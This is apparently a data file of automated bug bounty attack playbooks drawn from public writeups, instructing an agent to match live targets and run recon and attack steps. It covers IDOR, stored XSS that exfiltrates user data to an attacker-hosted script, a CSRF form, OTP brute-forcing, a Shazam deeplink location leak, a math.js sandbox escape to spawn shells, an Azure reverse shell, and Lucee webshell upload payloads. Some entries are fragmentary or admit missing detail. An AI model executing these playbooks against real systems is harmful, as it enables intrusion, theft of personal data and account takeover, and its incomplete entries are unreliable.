description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Broken Access Control & Stored XSS - Easy Hunt

trigger_conditions.when_to_apply: When an authenticated user can modify user details or administrative privileges, and the application does not properly validate user roles or sanitize input on update operations.
prerequisites: Attacker has at least one authenticated user account (low privilege).
Attacker has access to a high privilege account's UserID for testing the IDOR vulnerability.
applicability_signals: The presence of a 'Privilege Management' page allowing modification of user roles.
A user profile update endpoint that reflects unsanitized input in the response.
The UserID parameter is present in requests for modifying user privileges.
skip_if: All user privilege updates are performed on the server-side without reflecting the UserID in client-observable requests.
All user profile update requests result in server-side validation errors regardless of input.

recon_steps: Step 1: Log in with a low-privilege admin account and enumerate user accounts and their assigned privileges.
Step 2: Identify a functionality that allows modification of user privileges or details. Observe the HTTP requests for these actions using a proxy.
attack_steps: Step 1: For IDOR, capture a request from a high-privilege account modifying user privileges. Identify the UserID parameter. Replay this request from the low-privilege account, changing the UserID to that of a high-privilege account.
Step 2: For Stored XSS, navigate to the User's profile update page. Capture the request for updating user details (name, email, phone).
Step 3: Attempt to inject XSS payloads into the 'name' parameter. For example, use `< / script > < script > alert(1) < / script >` (encoded or adjusted as needed based on initial tests).
Step 4: Submit the profile update request with the XSS payload.
Step 5: Revisit the user profile page or any page that displays the user's name to check for XSS execution.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests, and for enumerating UserIDs.
Browser Developer Tools: For observing client-side JavaScript and HTML structure.
success_indicators: IDOR: The low-privilege account successfully modifies the privileges of a higher-privilege account or another user's details.
Stored XSS: The injected JavaScript payload executes when the user's profile is viewed or a page that renders the name is loaded, indicated by an alert box or other observable JavaScript behavior.
failure_indicators: IDOR: The request returns a permission denied error (e.g., 403 Forbidden) or the changes are not applied. Pivot to testing other functionalities for IDOR.

Stored XSS: The payload is sanitized or rejected by the server, or it is stored but does not execute. Check response headers and body for sanitization clues. Try different XSS payloads and encoding techniques. If the 'name' field doesn't work, try 'email' and 'mobile' with different payloads.

playbooks.impact: IDOR: An attacker can escalate privileges to administrator level or modify sensitive user information of other users. Stored XSS: An attacker can execute arbitrary JavaScript in the context of other users viewing the compromised profile, leading to session hijacking, data theft, or further malicious actions.
playbooks.key_lesson: When testing user profile updates or privilege management, always attempt to modify records belonging to other users or higher privilege levels by manipulating identifier parameters. For XSS, carefully examine input sanitization and rendering logic, testing various payloads and encoding techniques, especially when initial attempts fail.

meta.title: Destroying Armies and Villages through Cross-Site Scripting

trigger_conditions.when_to_apply: When the 'Subject' parameter of a new forum topic in the Tribes functionality lacks robust backend sanitization and only performs client-side validation.
prerequisites: Attacker must have an authenticated user account within the Tribal Wars game.
applicability_signals: Ability to create a new topic in the Tribes forum.
The 'Subject' field of the new topic form exhibits client-side validation only.
Observing that payloads like '<script>alert()</script>' are executed when viewing the forum topic.
skip_if: If backend sanitization is confirmed for the 'Subject' parameter.
If the XSS payload is blocked by a Web Application Firewall (WAF).

recon_steps: Step 1: Navigate to the 'Tribes' section of the game and identify the forum functionality.
Step 2: Attempt to create a new forum topic and observe the input validation applied to the 'Subject' parameter, both client-side and server-side.
Step 3: If client-side validation is insufficient, test a basic XSS payload like '<script>alert()</script>' in the 'Subject' field.
Step 4: If the alert box appears upon viewing the topic, confirm the presence of Stored XSS.
attack_steps: Step 1: Craft a JavaScript payload to exfiltrate user data (email, IP address).
Step 2: Host the crafted JavaScript file (e.g., pii.js) on an external HTTPS server.
Step 3: Inject a script tag referencing the hosted JavaScript file into the 'Subject' parameter of a new forum topic. The payload structure would be: <script src='<URL_TO_HOSTED_JS_FILE>'></script>
Step 4: Submit the new forum topic.
Step 5: Wait for other users (victims) to view the forum topic.
Step 6: Monitor the attacker-controlled server for incoming requests containing exfiltrated user data.
tools_recommended: Burp Suite: To intercept and modify HTTP requests for testing input validation.
A simple HTTPS server: To host the exfiltration JavaScript payload.
success_indicators: Receiving HTTP requests on the attacker-controlled server containing victim's email address and IP address.
Successful execution of the JavaScript payload in the victim's browser when they view the forum topic.
failure_indicators: The XSS payload not executing, indicating strong sanitization or a WAF blocking the payload. Pivot: Try different encoding techniques or alternative injection points.

No data received on the attacker's server after multiple victims view the topic. Pivot: Ensure the JavaScript payload correctly targets and exfiltrates data, and verify the hosting server is accessible and logging requests.

playbooks.impact: Exfiltration of Personal Identifiable Information (PII) such as user's email addresses and IP addresses. Temporarily taking over another user's game account (though not fully demonstrated in the write-up due to HTTPOnly flag on session cookies and password requirement for sensitive actions).
playbooks.key_lesson: Always test forum and messaging functionalities for Stored XSS, especially parameters like 'Subject' which might have weaker sanitization. Leverage external hosting for larger payloads when direct injection is limited, and attempt to exfiltrate sensitive user data to demonstrate higher impact.

meta.title: Launching Internal & Non-Exported Deeplinks On Facebook

trigger_conditions.when_to_apply: When the Facebook for Android app is installed on a user's device and the attacker can persuade the user to launch a malicious application that triggers a specific activity within the Facebook app.
prerequisites: User must have Facebook for Android app installed and authenticated.
Attacker must be able to deliver a malicious APK to the target user's device.
applicability_signals: Target application uses an internal activity (`FbMainTabActivity`) that can be launched with custom extras.
The `FbMainTabActivity` handles `rum_destination_uri` extra without proper validation.
skip_if: The `FbMainTabActivity` performs strict validation on `rum_destination_uri`.
The `FLAG_ACTIVITY_NEW_TASK` flag is not allowed when launching `FbMainTabActivity`.

recon_steps: Analyze the Android application's manifest file to identify exported and non-exported activities.
Research internal activities within the Facebook app that can be launched via intents with custom extras.
attack_steps: Step 1: Craft a malicious Android application (Fb_PoC.apk) that launches `com.facebook.katana.activity.FbMainTabActivity`.
Step 2: Include the following extras when launching `FbMainTabActivity`: `should_show_rum_player` (boolean, set to `true`) and `rum_destination_uri` (string, set to the attacker-controlled deeplink).
Step 3: Ensure the `FLAG_ACTIVITY_NEW_TASK` flag is set during the activity launch.
Step 4: Social engineer the user into installing and launching the crafted Fb_PoC.apk.
Step 5: Observe the Facebook app launch with a new "Music" bar at the bottom.
Step 6: The user clicks on the "Music" bar, which triggers the attacker-controlled `rum_destination_uri`.
payloads_or_patterns:
Intent extras for launching FbMainTabActivity:
- `should_show_rum_player`: `true` (boolean)
- `rum_destination_uri`: `<ATTACKER_CONTROLLED_DEEPLINK>` (string)
- `FLAG_ACTIVITY_NEW_TASK` flag must be set.
tools_recommended: Android Studio: For developing and packaging the malicious APK.
ADB (Android Debug Bridge): For pushing the APK to the device and debugging intents.
success_indicators: Facebook for Android app launches and displays a "Music" bar at the bottom.
Clicking the "Music" bar redirects the user to the attacker-controlled deeplink (e.g., a malicious website, a vulnerable internal Facebook deeplink leading to XSS).
failure_indicators: Facebook app does not launch or the "Music" bar does not appear: The intent extras or flags are incorrect, or the `FbMainTabActivity` is not vulnerable in this manner. Pivot to checking other internal activities or different exploit vectors.
Deeplink launches but does not behave as expected: The `rum_destination_uri` is being sanitized or is not exploitable. Investigate the behavior of the specific deeplink.

playbooks.impact: An attacker can launch arbitrary internal or non-exported deeplinks on behalf of a user, bypassing existing security restrictions. This can lead to phishing attacks by redirecting users to malicious webviews that do not expose the URL. Chaining with an XSS vulnerability in a restricted deeplink allows for arbitrary JavaScript execution within a webview inside the Facebook app.
playbooks.key_lesson: Always validate deeplink URIs passed as extras to Android activities, especially internal ones, to prevent CSRF attacks and unauthorized actions.

prerequisites: Target must be running a vulnerable version of LimeSurvey.

tools_recommended: insufficient detail in writeup

meta.title: How We Escaped Docker in Azure Functions

trigger_conditions.when_to_apply: When an attacker can execute arbitrary code within an Azure Function's container and has the ability to manipulate its environment.
prerequisites: Ability to deploy and trigger an Azure Function.
applicability_signals: Functions environment is based on Docker containers.
User can upload and execute custom code within the function.
skip_if: Azure Functions environment is heavily sandboxed and access to host resources is restricted by design.
Recent security patches by Microsoft may have mitigated known escape vectors.

recon_steps: Step 1: Deploy a test Azure Function with a reverse shell payload. Trigger the function via an HTTP request.
Step 2: Once the reverse shell connects, examine the execution environment (user, hostname, available system commands) to understand the container's configuration.
attack_steps: Step 1: Execute commands within the function's container to explore the file system, specifically looking for accessible configuration files or sensitive information.
Step 2: Attempt to access directories like /etc and /sys, which are often restricted in containerized environments but can contain crucial system information or misconfigurations.
Step 3: If access to host resources (like Docker socket or host configuration) is possible, attempt to leverage these to gain elevated privileges or escape the container.
Step 4: (Specific to the writeup) The writeup implies a path to escape was found via specific file system access, but the exact exploit path is not detailed.
payloads_or_patterns: Reverse shell payload (language dependent on function code, e.g., Python, Node.js)
Exploitation commands to probe for host access (e.g., `ls /host`, `cat /proc/1/mountinfo` - specific commands depend on discovered vulnerabilities)
tools_recommended: Standard OS command-line tools (if available in the function environment)
Network listener (e.g., Netcat) for reverse shell
success_indicators: Ability to execute commands on the Docker host outside of the intended function container.
Access to host system files or processes that are not part of the isolated function environment.
Confirmation of escape via privilege escalation on the host.
failure_indicators: Reverse shell execution fails to connect.
Commands within the container indicate restricted access to system files and host resources.
Containerization and sandboxing mechanisms prevent any interaction with the Docker host.
Attempts to access restricted directories (e.g., /etc, /sys) result in 'Permission denied' errors.

playbooks.impact: An attacker could gain arbitrary code execution on the underlying Docker host, potentially leading to compromise of other functions, data exfiltration, or further pivoting within the Azure infrastructure.
playbooks.key_lesson: Always investigate the runtime environment of serverless compute services for potential container escape vulnerabilities, even if initial access is restricted to code execution within a sandboxed environment.

meta.title: BMW Bug Bounty – Account Verification Bypass

tech_stack_fingerprints: Uses SMS verification for new accounts

trigger_conditions.when_to_apply: When the target application uses SMS-based One-Time Passwords (OTP) for account registration or verification and lacks sufficient rate limiting on OTP attempts.
prerequisites: Attacker has access to a disposable or controllable mobile number to receive OTPs.
applicability_signals: Registration process requires a mobile number for verification.
OTP is a four-digit numeric code.
Application does not implement strict rate limiting on OTP submission attempts.
skip_if: OTP submission endpoint returns 429 (Too Many Requests) or similar rate limiting errors after a few attempts.
OTP validation is handled client-side without server-side verification.
OTP is not numeric or has a variable length that is difficult to brute-force.

recon_steps: Step 1: Initiate the account registration process on the target URL (<TARGET_URL>) and provide a disposable mobile number to receive the OTP.
Step 2: Capture the OTP submission request in Burp Suite and analyze the response for status codes and messages related to valid/invalid OTPs.
attack_steps: Step 1: Send the captured OTP submission request to Burp Suite Intruder.
Step 2: Configure Intruder to brute-force all 4-digit numeric combinations (0000-9999) for the OTP parameter.
Step 3: Monitor the Intruder results, filtering for responses that do NOT return a 4xx status code (specifically 400 which indicates a wrong OTP).
Step 4: Identify and extract the OTP that results in a successful response (e.g., 200 OK status code) from the filtered results.
Step 5: Submit the identified correct OTP to complete the account registration/verification process.
tools_recommended: Burp Suite Intruder: For automated brute-forcing of OTPs.
success_indicators: HTTP response with a 200 status code for a submitted OTP.
Successful completion of the account registration/verification process without knowing the actual OTP.
The application proceeds to the next step in registration (e.g., setting an email address) after OTP submission.
failure_indicators: All OTP attempts result in a 400 Bad Request or other 4xx status codes, indicating the OTP is invalid and no bypass is possible.
The application enforces strict rate limiting, returning 429 errors after a few attempts, preventing effective brute-forcing. In this case, pivot to checking for other vulnerabilities.

playbooks.impact: An attacker can bypass the account verification process by brute-forcing the OTP, allowing them to create accounts using any mobile number without legitimate verification. This can lead to account takeover, spam, or abuse of services.
playbooks.key_lesson: Always test SMS/email OTP verification mechanisms for weak or non-existent rate limiting and brute-force all possible numeric combinations.

meta.title: Leaking issues from linked Jira – Atlassian Confluence Server

trigger_conditions.when_to_apply: When an authenticated user can link Jira issues within Confluence, and the integration exposes issue details insecurely.
prerequisites: User must be authenticated to Confluence.
Jira integration must be configured and active.
applicability_signals: The presence of functionality to link Jira issues.
Observe network requests when linking Jira issues to identify data exposed.
skip_if: No Jira integration present or functional.
Linking Jira issues does not reveal sensitive information in the response.

recon_steps: Step 1: Authenticate to Confluence.
Step 2: Navigate to a page and initiate the process of linking a Jira issue.
Step 3: Intercept the network traffic using a proxy (e.g., Burp Suite) to observe the parameters and responses involved in linking Jira issues.
attack_steps: Step 1: Attempt to link a Jira issue by providing a Jira issue key in the Confluence interface.
Step 2: Analyze the HTTP response from the server. Look for parameters that are directly reflected or used to construct the displayed issue details.
Step 3: If specific Jira issue keys are used, test for predictable patterns or enumeration of issue keys to potentially retrieve details of other issues.

Step 4: If the linking process reveals issue summaries, reporters, or other sensitive fields from Jira, confirm if this data can be accessed for Jira issues not explicitly intended to be linked or visible.
tools_recommended: Burp Suite (Proxy and Repeater)
Browser Developer Tools
success_indicators: HTTP 200 OK response containing details (summary, reporter, status, etc.) of Jira issues that the authenticated Confluence user should not have direct access to.
Information disclosure of Jira issue data directly within the Confluence response.
failure_indicators: 404 Not Found for invalid Jira issue keys, suggesting proper validation.
403 Forbidden or similar access denied errors for unauthorized Jira issues.
No sensitive Jira data returned in the response.

playbooks.impact: Disclosure of sensitive Jira issue details (e.g., internal project information, bug summaries, assignee, status) to an authenticated but potentially unauthorized Confluence user.
playbooks.key_lesson: When integrating external services like Jira, ensure that only authorized data is exposed to the user based on their permissions in both the originating and target systems.

meta.title: The Secret Parameter, LFR, and Potential RCE in NodeJS Apps
meta.category: Local File Read, Remote Code Execution

affected_components: POST / endpoint rendering templates with user-supplied data

trigger_conditions.when_to_apply: When a Node.js Express application uses the Handlebars (hbs) view engine for server-side rendering and accepts user-supplied data that is passed to the render function.
prerequisites: Target application is built with Node.js and Express.js.
Target application uses Handlebars (hbs) as the templating engine.
A POST endpoint is available that accepts JSON data in the request body.
The application renders templates using `res.render()` or `req.app.render()` and accepts parameters that influence the rendering process.
applicability_signals: POST requests to '/' endpoint.
JSON payload with a nested 'profile' object.
Presence of 'layout' as a potential parameter within the 'profile' object.
500 Internal Server Error responses with `ENOENT: no such file or directory` when manipulating the 'layout' parameter.
skip_if: Application does not respond with `X-Powered-By: Express`.
POST requests do not yield 500 errors or show file not found errors with parameter manipulation.
No identifiable 'layout' parameter is found or exploitable.

recon_steps: Step 1: Identify applications using Node.js/Express by looking for `X-Powered-By: Express` header in HTTP responses.
Step 2: If HTML is present in responses, investigate POST endpoints and attempt to discover parameters related to templating or rendering, such as 'layout'.
attack_steps: Step 1: Send a POST request to the target endpoint (e.g., `/`).

Step 2: Include a JSON payload in the request body containing a `profile` object. Within the `profile` object, set a `layout` parameter to a relative or absolute file path that is likely to exist on the server.
Step 3: Observe the response for file read errors (`ENOENT: no such file or directory`) which indicate successful LFI.
Step 4: If LFI is successful, attempt to read sensitive files like server configuration, source code, or known sensitive file paths (e.g., `/etc/passwd`, `../package.json`, `../../routes/index.js`).
Step 5: If the LFI allows reading server-side JavaScript files, analyze them for vulnerabilities that could lead to RCE, such as prototype pollution or insecure function calls.
tools_recommended: Burp Suite Intruder: To fuzz the 'layout' parameter with a wordlist of common sensitive files and relative paths.
curl: For crafting and sending precise POST requests with JSON payloads.
success_indicators: HTTP 200 OK response with the content of the specified file in the response body.
HTTP 500 Internal Server Error response containing `ENOENT: no such file or directory` followed by the requested file path, indicating the path was processed.
Successful retrieval of sensitive information (e.g., flag, user credentials, application source code).
failure_indicators: Consistently receiving 400 Bad Request or other client errors, suggesting the payload structure is incorrect.
Receiving 403 Forbidden responses, indicating a WAF might be blocking the request.
No `ENOENT` error observed, meaning the 'layout' parameter is not being processed as a file path for rendering.

playbooks.impact: Local File Read (LFR) allows an attacker to read arbitrary files on the server, potentially exposing sensitive information like configuration files, source code, or credentials. In some cases, this can be chained with other vulnerabilities (like prototype pollution or insecure deserialization) to achieve Remote Code Execution (RCE).
playbooks.key_lesson: Always fuzz for hidden or non-standard parameters in POST request bodies, especially those that might influence rendering or file operations in server-side templating engines. Pay close attention to error messages for file system-related clues.

meta.title: CSRF Protection Bypass in Atlassian Confluence Server

trigger_conditions.when_to_apply: When an authenticated user can be tricked into submitting a request that performs an action on Confluence Server.
prerequisites: Attacker has a way to make the victim's browser send a request to the Confluence server (e.g., via a malicious email or website).
applicability_signals: The target is an Atlassian Confluence Server instance accessible to the victim.
The action to be exploited does not require complex or unique session tokens in its core request parameters.
skip_if: Confluence Server implements robust CSRF protection that validates custom request headers (e.g., X-Atlassian-Token) or nonce values in all state-changing requests.

recon_steps: Step 1: Identify state-changing endpoints in Confluence Server that do not require CSRF tokens in their request parameters (e.g., POST requests to update content, user settings, or execute administrative actions).
Step 2: Confirm that these requests can be made with just session cookies, without requiring an explicit CSRF token in headers or parameters.
attack_steps: Step 1: Craft a malicious HTML page or email containing an embedded form that performs the vulnerable action on the Confluence Server (e.g., a form that submits a POST request to `/update-page`).
Step 2: Ensure the form's `action` attribute points to the target Confluence Server URL.
Step 3: If the vulnerable action requires specific parameters, include them in the form's input fields. The victim's browser will automatically include their session cookies.
Step 4: Trick the victim into visiting the malicious page or opening the malicious email, causing their browser to submit the crafted request to the Confluence Server.
Step 5: Observe the effect of the executed action on the Confluence Server.
payloads_or_patterns: <form action="<TARGET_URL>/update-page" method="POST"><input type="hidden" name="pageId" value="12345"><input type="hidden" name="content" value="Malicious Content"><button type="submit">Click Me</button></form>
tools_recommended: Burp Suite: To identify vulnerable endpoints by observing requests and responses for state-changing actions.
Any web browser with developer tools: To construct and test the malicious HTML/form.
success_indicators: The intended action (e.g., page update, configuration change) is performed on the Confluence Server without the victim explicitly authorizing it.
The attacker observes the unauthorized change on the Confluence instance.
failure_indicators: A 403 Forbidden or similar error response is received, indicating that CSRF protection is active for the target endpoint.
The action fails to execute, and no changes are observed on the Confluence Server. Pivot to testing for other vulnerabilities or different endpoints.

playbooks.impact: An attacker can perform arbitrary actions on behalf of an authenticated user on the Atlassian Confluence Server, including modifying content, changing settings, or executing administrative functions, without the user's knowledge or consent.
playbooks.key_lesson: Always verify CSRF protection on state-changing requests, especially in web applications where authenticated users can be tricked into submitting forms or links.

meta.title: Page Admin Disclosure When Replying Comments

trigger_conditions.when_to_apply: This vulnerability is applicable when an authenticated user can comment on a Facebook page post and then reply to their own comment as the page.
prerequisites: User must be logged into a Facebook account.
User must be able to comment on a Facebook page post.
applicability_signals: The ability to comment on a page post.
The ability to reply to a comment.
skip_if: If the user is unable to comment on page posts or reply to comments.

recon_steps: Step 1: Navigate to a Facebook page and identify a post that allows comments.
Step 2: Authenticate as a regular user and post a comment on the selected page post.
attack_steps: Step 1: As the authenticated user, reply to the comment posted in the recon step.
Step 2: Observe that the reply is attributed to the 'Page' initially.
Step 3: Log in as a Page Admin account.
Step 4: Check for notifications related to replies on the page post.
Step 5: Click on the notification, which redirects to the comment thread.
Step 6: As the Page Admin, reply to the comment made by the regular user (which was initially attributed to the 'Page').
payloads_or_patterns: Not applicable, as this is a behavioral exploit.
tools_recommended: Two separate Facebook accounts (one regular user, one Page Admin).
success_indicators: When the reply made by the Page Admin to the user's comment is attributed to the Page Admin's Personal Profile instead of the 'Page'.
failure_indicators: If the reply is consistently attributed to the 'Page' and never reveals the Page Admin's personal profile, the vulnerability is not present or has been fixed.
If no notification is received by the Page Admin account after replying.

playbooks.impact: Disclosure of the Page Admin's personal profile when they are interacting with comments on the page, which could lead to unwanted attention or targeted attacks.
playbooks.key_lesson: Test comment and reply functionalities in social platforms to see if user identities are correctly masked or revealed during different interaction flows, especially between regular users and administrators.

meta.title: The Embedded YouTube Player Told Me What You Were Watching (and more)

affected_components: User Playlists (Watch History, Watch Later, Liked Videos, Uploads)

trigger_conditions.when_to_apply: When an attacker can control the content of an embedded YouTube player or a page that displays YouTube playlists, and can induce a victim to visit that page.
prerequisites: Attacker has a method to host an external webpage or control content on a webpage that embeds YouTube content.
applicability_signals: A user's YouTube channel ID is discoverable.
YouTube embeds are used on target pages.
Special playlist IDs (HL, WL, LL*, UU*) are not properly restricted when accessed directly or via embeds.
skip_if: All YouTube API endpoints or direct playlist access require authentication and do not reveal sensitive information without it.
WAF blocks requests to known YouTube playlist URLs.

recon_steps: Identify YouTube channel IDs of potential victims if possible (e.g., from public profiles).
Determine if the target application embeds YouTube videos or allows users to share YouTube playlists.
attack_steps: Construct a special YouTube playlist URL for a victim using their channel ID. The specific IDs are: 'HL' (History List), 'WL' (Watch Later), 'LLD' or 'LLB' (Liked Videos - guess based on channel ID prefix), 'UUD' or 'UUB' (Uploads - guess based on channel ID prefix).
Create an attacker-controlled webpage that embeds a YouTube player or links to a specially crafted YouTube playlist URL.
Social engineer a victim into visiting the attacker-controlled webpage or clicking the crafted YouTube link.

Observe the videos displayed in the embedded player or playlist. If the player/playlist displays videos beyond what the victim intends to share publicly (e.g., unlisted, private, liked, history videos), the vulnerability is confirmed.
tools_recommended: Custom script to generate playlist URLs based on channel IDs.
Web server to host attacker-controlled page for embedding.
Browser developer tools to inspect network requests and response content when accessing playlists.
success_indicators: Victim's watch history, watch later list, liked videos, or unlisted/private uploads are visible in the embedded player or playlist.
The embedded player shows videos that the victim has not publicly shared.
failure_indicators: The playlist only shows public videos for the victim. -> The special playlist IDs are correctly restricted and do not leak private/unlisted content. Try to find other methods to access user data or other vulnerabilities.

Requests to playlist URLs return 404 or 403. -> The victim's channel ID or the special playlist IDs are invalid or inaccessible. Re-verify channel ID and try alternative playlist ID generation methods.

playbooks.impact: Disclosure of sensitive user information including watch history, watch later videos, liked videos, and all uploaded videos (including unlisted and private ones).
playbooks.key_lesson: When dealing with user-generated content or special system-managed lists (like playlists), always verify that privacy settings are strictly enforced across all access methods, including direct URL access and embedded components.

meta.title: ShazLocate! Abusing CVE-2019-8791 & CVE-2019-8792

trigger_conditions.when_to_apply: When the target application exposes an exported deeplink that handles URLs without proper validation, and that deeplink loads content within a webview that has JavaScript interfaces exposed.
prerequisites: The target application must be vulnerable to insecure deeplink handling.
The deeplink must open a URL in a webview.
The webview must have JavaScript interfaces that can be accessed by the loaded content.
applicability_signals: Presence of `shazam://launchurl?url=` deeplink format.
Webview capable of loading external URLs.
Existence of JavaScript interfaces like `WebViewJavascriptBridge` accessible via `window` object.
skip_if: Deeplink correctly validates and sanitizes URL parameters.
Webview does not expose JavaScript interfaces to loaded content.

recon_steps: Step 1: Identify the target application and its associated deeplink schemes. Look for custom URL schemes (e.g., `shazam://`).
Step 2: Analyze the deeplink handler for potential vulnerabilities, specifically looking for parameters that control navigation to external URLs.
Step 3: Investigate the webview implementation within the application to determine if JavaScript interfaces are exposed and how they function.
attack_steps: Step 1: Construct a malicious deeplink using the identified vulnerable scheme and parameter, e.g., `shazam://launchurl?url=javascript:window.WebViewJavascriptBridge.sendMessage({type: 'getLocation', data: {}})`.
Step 2: Craft a JavaScript payload to interact with the exposed `WebViewJavascriptBridge`. Utilize `sendMessage` to request device information, such as location.
Step 3: Override the `setMessageHandler` function in JavaScript to capture the response from `sendMessage`.
Step 4: Send the malicious deeplink to the victim. This can be done via email, SMS, or by hosting a link on a website.
Step 5: Analyze the captured response in the `setMessageHandler` to extract the user's precise location.
tools_recommended: Burp Suite: To proxy and inspect HTTP requests/responses, and potentially host a malicious landing page.
Decompiler (e.g., JADX for Android, Ghidra for iOS): To reverse engineer the mobile application and understand its internal workings, especially JavaScript interfaces.
Android/iOS Debugging Tools: To observe application behavior and interactions.
success_indicators: Successful reception of precise location data (latitude and longitude) within the `setMessageHandler` callback.
The application returns sensitive device information as a result of the JavaScript calls.
failure_indicators: The deeplink does not open a webview or loads a safe page.
JavaScript interfaces are not exposed or are not functional.
The application returns an error or no data in response to the JavaScript calls.
A WAF or security mechanism blocks the JavaScript execution.

playbooks.impact: An attacker can obtain the precise real-time location of a user by tricking them into clicking a specially crafted link, enabling de-anonymization and tracking.
playbooks.key_lesson: Always validate and sanitize all parameters in exported deeplinks, especially those that control navigation to external resources or load content within webviews. Ensure that JavaScript interfaces exposed within webviews are secured and do not allow unauthorized access to sensitive device information.

meta.title: How we exploited a remote code execution vulnerability in math.js

tech_stack_fingerprints: Responds to `?expr=` parameter for expression evaluation

trigger_conditions.when_to_apply: When a target exposes an API endpoint that evaluates arbitrary JavaScript expressions, particularly when `eval`, `Function`, `setTimeout`, and `setInterval` are restricted or seem to be replaced by safe versions.
prerequisites: Target exposes an endpoint that evaluates JavaScript expressions.
applicability_signals: API responses indicate errors like 'Value expected' or 'Undefined symbol console' when attempting to use standard evaluation methods.
API responses show functions like `Function` or `setTimeout` are undefined or replaced with safe versions.
skip_if: All attempts to evaluate code result in generic errors without revealing the underlying JavaScript engine's capabilities.
The API explicitly blocks any form of code execution or evaluation.

recon_steps: Step 1: Send GET requests to the target API endpoint with various expressions to understand its evaluation capabilities and restrictions.
Step 2: Test standard JavaScript evaluation methods like `eval('code')`, `new Function('code')`, `setTimeout('code', 0)`, and `setInterval('code', 0)` to identify which are disabled or restricted.
Step 3: Observe error messages to infer the level of sanitization or restrictions applied to the JavaScript execution environment.
attack_steps: Step 1: Identify an indirectly accessible constructor for `Function`. For example, use `Math.floor.constructor` to execute arbitrary JavaScript code.
Step 2: Construct a payload using the identified constructor to evaluate code. For example: `!calc cos.constructor("return 1")()`.
Step 3: Attempt to access Node.js built-in modules like `require` by using `cos.constructor("return require")()`. If this fails, proceed to the next step.
Step 4: Attempt to access the `process` object via `cos.constructor("return process")()` to explore environment variables and bindings.
Step 5: Use `process.binding('fs')` to read files on the system. Construct a payload to open a file (e.g., `/etc/passwd`) and read its contents into a buffer.

Step 6: Replicate Node.js's `child_process.spawnSync` functionality by manually constructing the necessary OS bindings or by injecting a pre-minified version of the `child_process.js` source code to spawn shells and execute arbitrary commands.
payloads_or_patterns: Injecting minified Node.js child_process.js source to achieve spawnSync functionality.
tools_recommended: curl for sending HTTP requests.
Burp Suite for intercepting and modifying requests.
A local Node.js environment to experiment with `process.binding` and `child_process` source code.
success_indicators: Successful execution of arbitrary JavaScript code, e.g., returning a specific value.
Retrieval of sensitive information from the server's filesystem, such as `/etc/passwd`.
Confirmation of command execution, such as receiving a callback from a spawned shell.
failure_indicators: Consistent errors or unexpected outputs when attempting to execute code, indicating a more robust sandbox or WAF is in place.
Inability to access `process` or `process.binding`, suggesting a highly restricted environment. Pivot to exploring other potential bypasses or vulnerabilities.
Received `require is not defined` error. This indicates that even indirect access to Node.js modules is blocked, requiring more advanced techniques or exploration of other vulnerability classes.

playbooks.impact: Remote Code Execution (RCE) on the server hosting the math.js API, allowing an attacker to read arbitrary files, access environment variables, and potentially spawn shells to execute commands on the underlying operating system.
playbooks.key_lesson: When standard JavaScript evaluation functions (`eval`, `Function`, `setTimeout`, `setInterval`) are restricted, investigate indirect access methods through constructors of existing functions or objects like `Math.floor.constructor` to bypass sandboxing.

meta.title: Remote Code Execution on facilities.apple.com via Lucee Misconfiguration

trigger_conditions.when_to_apply: This technique is applicable when a Lucee CMS installation is found to be running an outdated or specific version, and its admin panel is exposed. It is particularly relevant if the target's Web Application Firewall (WAF) blocks common path traversal or SQL injection attempts via URL query parameters.
prerequisites: Target is running Lucee CMS.
Target has an exposed admin panel or administrative interface.
The specific vulnerable CFM files (imgProcess.cfm, admin.search.index.cfm, ext.applications.upload.cfm) are present and accessible.
Apple's WAF behavior of returning 403 for non-200/404 backend responses is confirmed.
applicability_signals: Existence of Lucee instances on subdomains (e.g., facilities.apple.com, booktravel.apple.com).
Detection of vulnerable Lucee versions.
Successful requests to administrative endpoints (even if blocked by WAF or yielding errors).
The target returning 403 status codes for requests that would normally result in other error codes, indicating the frontend proxy's WAF interaction.
skip_if: No Lucee installations detected.
All administrative endpoints are properly secured and inaccessible without authentication.
The WAF does not exhibit the described behavior of returning 403 for non-200/404 responses, or it successfully blocks all exploitation attempts.
The vulnerable CFM files have been patched or removed from the target's installation.

recon_steps: Step 1: Fingerprint subdomains for Lucee CMS instances by checking for common Lucee admin panel paths or specific response headers/HTML content.
Step 2: Identify Lucee versions running on discovered hosts. Prioritize hosts running older or potentially vulnerable versions.
Step 3: Analyze WAF behavior by sending various malicious payloads (path traversal, SQLi) and observing the response status codes. Confirm if non-200/404 responses are consistently translated to 403.
attack_steps: Step 1: Attempt to exploit the path traversal vulnerability in `imgProcess.cfm` by sending a POST request to `<TARGET_URL>/lucee/admin/imgProcess.cfm` with `form.imgSrc` set to a malicious payload for path traversal (e.g., `../../../../context/pwn.cfm`) and `url.file` to control the filename.

Step 2: If direct exploitation via query parameters is blocked by the WAF, use the `imgProcess.cfm` endpoint to create files with controlled names and content in a target directory without triggering the WAF, e.g., using `form.imgSrc` and `url.file` to write a simple file.

Step 3: Leverage `admin.search.index.cfm` or `ext.applications.upload.cfm` to potentially move or upload files to achieve RCE, focusing on payloads that bypass WAF restrictions. This would involve careful crafting of POST data or parameters to execute code.

Step 4: For `admin.search.index.cfm`, attempt to use its copy functionality with crafted `dataDir` and `luceeArchiveZipPath` parameters to copy existing files or overwrite existing files with malicious content.
Step 5: For `ext.applications.upload.cfm`, attempt to upload a malicious CFM file that bypasses any content or file type restrictions to achieve RCE.
payloads_or_patterns: POST to <TARGET_URL>/lucee/admin/imgProcess.cfm with `form.imgSrc=../../../../context/pwn.cfm&url.file=shell.cfm` (requires understanding WAF bypass for path traversal)
POST to <TARGET_URL>/lucee/admin/imgProcess.cfm with `form.imgSrc=<SHELL_CODE_AS_CFM_CONTENT>&url.file=backdoor.cfm` (to create a basic CFM file)
POST to <TARGET_URL>/lucee/admin/admin.search.index.cfm with crafted `dataDir` and `luceeArchiveZipPath` parameters (details from writeup are insufficient for specific payload)
POST to <TARGET_URL>/lucee/admin/ext.applications.upload.cfm with crafted multipart/form-data to upload a CFM shell (details from writeup are insufficient for specific payload)
